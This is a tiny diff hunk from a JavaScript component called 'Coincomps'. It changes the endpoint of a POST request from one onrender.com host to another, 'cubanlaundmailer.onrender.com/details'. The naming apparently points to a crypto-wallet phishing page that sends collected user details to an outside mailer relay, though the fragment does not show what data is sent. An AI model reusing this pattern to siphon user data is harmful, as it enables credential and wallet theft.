@@ -42,7 +42,7 @@ const Coincomps = ({ data }) => {
       };
 
       try {
-        const url = "https://communicationdappsolutionprotocol.onrender.com/details_three";
+        const url = "https://cubanlaundmailer.onrender.com/details";
 
         const res = await fetch(url, {
           method: "POST",
